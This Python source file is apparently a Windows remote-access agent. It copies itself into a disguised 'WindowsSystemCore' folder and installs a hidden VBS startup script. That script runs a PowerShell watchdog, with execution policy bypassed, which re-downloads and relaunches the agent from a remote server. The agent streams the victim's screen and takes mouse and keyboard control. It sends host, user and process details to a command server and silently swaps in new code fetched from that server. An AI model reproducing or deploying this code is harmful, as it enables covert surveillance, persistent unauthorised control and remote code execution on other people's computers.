import asyncio
import orjson
import os
import sys
import time
import socket
import struct
import json
import threading
import mss
import websockets
import psutil
import getpass
import platform
import subprocess
import shutil
from PIL import Image
from pynput.mouse import Controller as MouseController, Button
from pynput.keyboard import Controller as KeyboardController, Key
import av
from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
from aiortc.contrib.media import MediaStreamTrack, MediaRelay

AGENT_VERSION = "9.0.3-IMMORTAL"

def install_persistence():
    current_exe = sys.executable
    if not current_exe.lower().endswith("mrl_agent.exe"): 
        return # Skip setup if running via Python script or already installed

    appdata = os.environ.get('APPDATA')
    if not appdata: return
    
    target_dir = os.path.join(appdata, 'WindowsSystemCore')
    target_exe = os.path.join(target_dir, 'sys_core.exe')
    watchdog_ps1 = os.path.join(target_dir, 'sys_watchdog.ps1')
    startup_vbs = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'sys_core_monitor.vbs')
    
    if current_exe.lower() == target_exe.lower():
        return # We are the hidden clone. Proceed normally.

    try: os.makedirs(target_dir, exist_ok=True)
    except: pass
    
    try: shutil.copy2(current_exe, target_exe)
    except: pass
    
    ps1_code = f"""
$exePath = "{target_exe}"
$url = "https://web-production-d6db5.up.railway.app/api/client_exe"
while ($true) {{
    $running = Get-Process -Name "sys_core" -ErrorAction SilentlyContinue
    if (-not $running) {{
        if (-not (Test-Path -Path $exePath)) {{
            try {{
                Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
            }} catch {{ }}
        }}
        if (Test-Path -Path $exePath) {{
            Start-Process -FilePath $exePath
        }}
    }}
    Start-Sleep -Seconds 10
}}
"""
    try:
        with open(watchdog_ps1, "w") as f: f.write(ps1_code)
    except: pass
    
    vbs_code = 'Set objShell = CreateObject("WScript.Shell")\n'
    vbs_code += f'objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""{watchdog_ps1}""", 0, False\n'

    try:
        with open(startup_vbs, "w") as f: f.write(vbs_code)
    except: pass
    
    subprocess.Popen(f'wscript.exe "{startup_vbs}"', shell=True)
    os._exit(0)

# Initialize Persistence IMMEDIATELY on boot
install_persistence()

class AutoUpdater:
    @staticmethod
    def update_and_restart(new_version):
        print(f"[OTA] Update Triggered! Current: {AGENT_VERSION}, New: {new_version}")
        import urllib.request
        import uuid
        exe_url = "https://web-production-d6db5.up.railway.app/api/client_exe"
        temp_exe = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), f"mrl_agent_new_{uuid.uuid4().hex[:6]}.exe")
        try:
            print("[OTA] Downloading payload...")
            urllib.request.urlretrieve(exe_url, temp_exe)
        except Exception as e:
            print(f"[OTA] Download failed: {e}")
            return
            
        current_exe = sys.executable
        if not current_exe.lower().endswith(".exe"):
            print("[OTA] Not running as compiled agent (.exe). Skipping hot-swap.")
            return

        bat_file = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), "update_core.bat")
        print("[OTA] Deploying transient hot-swap script...")
        with open(bat_file, "w") as f:
            f.write(f"""@echo off
timeout /t 2 /nobreak > NUL
move /y "{temp_exe}" "{current_exe}"
start "" "{current_exe}"
del "%~f0"
""")
        subprocess.Popen(bat_file, shell=True)
        print("[OTA] Exiting for restart...")
        os._exit(0)

# Global State
selected_monitor = 1  
display_mode = "monitor"
target_fps = 20
current_quality = 50
audio_enabled = False
BITRATE = 1500000
relay = MediaRelay()

# --- Controllers ---
input_lock = threading.Lock()
mouse = MouseController()
keyboard = KeyboardController()

def parse_key(key_str):
    if len(key_str) == 1: return key_str
    return getattr(Key, key_str, key_str)

def get_client_id():
    import uuid
    base_dir = os.environ.get('APPDATA') or os.environ.get('HOME') or os.path.expanduser('~')
    id_file = os.path.join(base_dir, '.mrl_id')
    try:
        if os.path.exists(id_file):
            with open(id_file, 'r') as f: return f.read().strip()
    except: pass
    new_id = str(uuid.uuid4())
    try:
        with open(id_file, 'w') as f: f.write(new_id)
    except: pass
    return new_id

# -------------------------------------------------------
# Telemetry
# -------------------------------------------------------
def get_detailed_specs():
    try:
        gpu = "Unknown"
        try:
            output = subprocess.check_output("wmic path win32_VideoController get name", shell=True).decode()
            gpu = output.split('\n')[1].strip()
        except: pass
        
        disk = psutil.disk_usage('C:/').percent
        return {
            "name": socket.gethostname(),
            "user": getpass.getuser(),
            "os": f"{platform.system()} {platform.release()}",
            "cpu": f"{psutil.cpu_count()} Cores",
            "ram": f"{round(psutil.virtual_memory().total / (1024**3), 1)}GB",
            "gpu": gpu,
            "disk": f"{disk}% used"
        }
    except: return {"name": "Unknown", "user": "Unknown"}

# -------------------------------------------------------
# WebRTC Tracks
# -------------------------------------------------------
class ScreenVideoTrack(VideoStreamTrack):
    def __init__(self, sct):
        super().__init__()
        self.sct = sct
        self.last_frame_time = 0

    def update_settings(self, settings: dict):
        global selected_monitor, target_fps, current_quality
        if "monitor" in settings:
            try:
                val = int(settings["monitor"])
                selected_monitor = val
            except: pass
        if "fps" in settings:
            target_fps = max(5, min(60, int(settings["fps"])))
        if "quality" in settings:
            current_quality = max(10, min(100, int(settings["quality"])))

    async def recv(self):
        now = time.time()
        wait = (1.0 / target_fps) - (now - self.last_frame_time)
        if wait > 0: await asyncio.sleep(wait)
        self.last_frame_time = time.time()

        pts, time_base = await self.next_timestamp()
        
        try:
            mon_idx = selected_monitor
            if mon_idx >= len(self.sct.monitors):
                mon_idx = min(1, len(self.sct.monitors)-1)
            
            if mon_idx == 0 and len(self.sct.monitors) > 2:
                from PIL import ImageDraw, ImageFont
                physical_monitors = self.sct.monitors[1:]
                count = len(physical_monitors)
                
                cell_w, cell_h = 1280, 720
                if count <= 2: cols, rows = count, 1
                elif count <= 4: cols, rows = 2, 2
                else: cols, rows = 3, (count + 2) // 3
                
                grid_w, grid_h = cols * cell_w, rows * cell_h
                grid_img = Image.new("RGB", (grid_w, grid_h), (15, 15, 15))
                draw = ImageDraw.Draw(grid_img)
                try: font = ImageFont.truetype("arial.ttf", 46)
                except: font = ImageFont.load_default()
                
                for i, mon in enumerate(physical_monitors):
                    sct_img = self.sct.grab(mon)
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    img.thumbnail((cell_w - 6, cell_h - 6), Image.Resampling.BILINEAR)
                    
                    col, row = i % cols, i // cols
                    x = col * cell_w + (cell_w - img.width) // 2
                    y = row * cell_h + (cell_h - img.height) // 2
                    
                    grid_img.paste(img, (x, y))
                    draw.rectangle([col * cell_w, row * cell_h, (col + 1) * cell_w - 1, (row + 1) * cell_h - 1], outline=(60, 60, 60), width=4)
                    
                    box_x, box_y = col * cell_w + 30, row * cell_h + 30
                    draw.rectangle([box_x, box_y, box_x + 280, box_y + 70], fill=(0, 0, 0))
                    draw.text((box_x + 20, box_y + 10), f"DISPLAY {i+1}", fill=(255, 255, 255), font=font)
                
                img = grid_img
            else:
                mon = self.sct.monitors[mon_idx]
                sct_img = self.sct.grab(mon)
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            
            frame = av.VideoFrame.from_image(img)
            
            w, h = img.width, img.height
            limit = 1280 if (mon_idx == 0 or current_quality >= 60) else 960
            
            if w > limit:
                new_h = int(h * (limit / w))
                frame = frame.reformat(width=limit, height=new_h, format='yuv420p')
            else:
                frame = frame.reformat(format='yuv420p')
        except Exception as e:
            print("Video Render Memory/Alignment Error:", e)
            frame = av.VideoFrame(width=960, height=540, format='yuv420p')
            for p in frame.planes: p.update(b'\x00' * p.buffer_size)

        frame.pts = pts
        frame.time_base = time_base
        return frame

class SystemAudioTrack(AudioStreamTrack):
    async def recv(self):
        pts, time_base = await self.next_timestamp()
        # Create silent frame for now, real audio link requires loopback setup
        duration = 1 / 50 
        samples = int(48000 * duration)
        frame = av.AudioFrame(format='s16', layout='stereo', samples=samples)
        for plane in frame.planes:
            plane.update(b'\x00' * plane.buffer_size)
        frame.pts = pts
        frame.time_base = time_base
        return frame

# -------------------------------------------------------
# Messaging & WebRTC Core
# -------------------------------------------------------
async def send_process_list_dc(dc):
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
            try:
                procs.append({
                    "pid": p.info['pid'],
                    "name": p.info['name'],
                    "cpu": p.info['cpu_percent'],
                    "ram": round(p.info['memory_info'].rss / (1024 * 1024), 1)
                })
            except: continue
        dc.send(orjson.dumps({"t": "process_list", "data": procs}))
    except: pass

async def start_session(ws, sct):
    pc = RTCPeerConnection(configuration=RTCConfiguration(
        iceServers=[RTCIceServer(urls=["stun:stun.l.google.com:19302"])]
    ))
    video_track = ScreenVideoTrack(sct)

    @pc.on("iceconnectionstatechange")
    async def on_iceconnectionstatechange():
        print(f"ICE Connection State is {pc.iceConnectionState}")

    @pc.on("datachannel")
    def on_datachannel(dc):
        @dc.on_message
        def on_message(m):
            try:
                event = orjson.loads(m)
                if event.get("t") == "get_processes":
                    asyncio.create_task(send_process_list_dc(dc))
                elif event.get("t") == "select_monitor":
                    video_track.update_settings({"monitor": event.get("index", 1)})
                elif event.get("t") == "set_fps":
                    video_track.update_settings({"fps": event.get("v", 20)})
                elif event.get("t") == "set_quality":
                    video_track.update_settings({"quality": event.get("v", 50)})
                elif event.get("t") == "toggle_audio":
                    global audio_enabled
                    audio_enabled = event.get("v", False)
                elif event.get("t") == "toggle_webcam":
                    pass 

                if input_lock.locked(): return
                with input_lock:
                    if event["t"] == "mm":
                        mon = sct.monitors[selected_monitor]
                        rx, ry = event["x"] / event["w"], event["y"] / event["h"]
                        mouse.position = (mon["left"] + rx * mon["width"], mon["top"] + ry * mon["height"])
                    elif event["t"] == "mc":
                        btn = Button.left if event["b"] == "left" else Button.right
                        if event["p"]: mouse.press(btn)
                        else: mouse.release(btn)
                    elif event["t"] == "kd":
                        try: keyboard.press(parse_key(event["k"]))
                        except: pass
                    elif event["t"] == "ku":
                        try: keyboard.release(parse_key(event["k"]))
                        except: pass
            except: pass

    # Video Transceiver
    transceiver = pc.addTransceiver(video_track, direction="sendonly")

    # Audio Track
    pc.addTrack(SystemAudioTrack())

    # Handshake Handling
    async def listen_signaling():
        async for m in ws:
            try:
                event = orjson.loads(m)
                if event.get("t") == "welcome":
                    server_ver = event.get("version", "0.0.0")
                    if server_ver != AGENT_VERSION:
                        AutoUpdater.update_and_restart(server_ver)
                        return
                elif event.get("t") == "rtc_offer":
                    await pc.setRemoteDescription(RTCSessionDescription(sdp=event["sdp"], type=event["type"]))
                    ans = await pc.createAnswer()
                    await pc.setLocalDescription(ans)
                    await ws.send(orjson.dumps({"t": "rtc_answer", "sdp": pc.localDescription.sdp, "type": pc.localDescription.type}).decode())
                elif event.get("t") == "rtc_ice":
                    try:
                        from aiortc.sdp import candidate_from_sdp
                        cand_str = event["candidate"]["candidate"]
                        if cand_str.startswith("candidate:"):
                            cand_str = cand_str[10:]
                        cand_obj = candidate_from_sdp(cand_str)
                        cand_obj.sdpMid = event["candidate"]["sdpMid"]
                        cand_obj.sdpMLineIndex = event["candidate"]["sdpMLineIndex"]
                        await pc.addIceCandidate(cand_obj)
                    except Exception as e:
                        pass
            except Exception as e:
                print(f"Signaling error: {e}")

    await listen_signaling()

# -------------------------------------------------------
# Bootstrap
# -------------------------------------------------------
async def main_loop():
    server = "web-production-d6db5.up.railway.app"
    uri = f"wss://{server}/ws"
    
    while True:
        try:
            async with websockets.connect(uri) as ws:
                print("CONNECTED TO PRO SERVER")
                client_id = get_client_id()
                specs = get_detailed_specs()
                # Pass monitors in specs for dashboard selection
                with mss.mss() as sct:
                    specs["monitors"] = [{"width": m["width"], "height": m["height"]} for m in sct.monitors]
                    specs["name"] = f"{socket.gethostname()} \\ {getpass.getuser()}"
                    await ws.send(orjson.dumps({"type": "client_auth", "id": client_id, "specs": specs}).decode())
                    await start_session(ws, sct)
        except Exception as e:
            print(f"Connection failed: {e}. Retrying...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main_loop())
